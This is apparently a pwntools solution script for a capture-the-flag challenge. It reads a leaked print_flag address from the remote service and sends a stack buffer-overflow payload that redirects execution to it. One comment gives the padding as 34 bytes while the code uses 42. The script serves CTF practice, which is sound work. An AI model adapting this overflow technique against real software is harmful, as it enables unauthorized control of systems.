from pwn import *

payload1 = b"what?"

# p = process("./chall")
p = remote("old-memes-never-die.ctf.zone", 4242)

# receive leak
output = p.recvuntil(")")
print_addr = output.decode().strip("()").split(": ")[-1]
print(print_addr)
print_addr = int(print_addr, 16)  # convert hex string to int
print(f"[+] print_flag address: {hex(print_addr)}")

# First input
p.recvuntil("name?")
p.sendline(payload1)

# Overflow: 34 bytes padding + print_flag() address
payload2 = b"a" * 42   + p32(print_addr)
p.recvuntil("name?")
p.sendline(payload2)
time.sleep(2)
print(p.recvline())
print(p.recvline())
print(p.recvline())
# p.interactive()
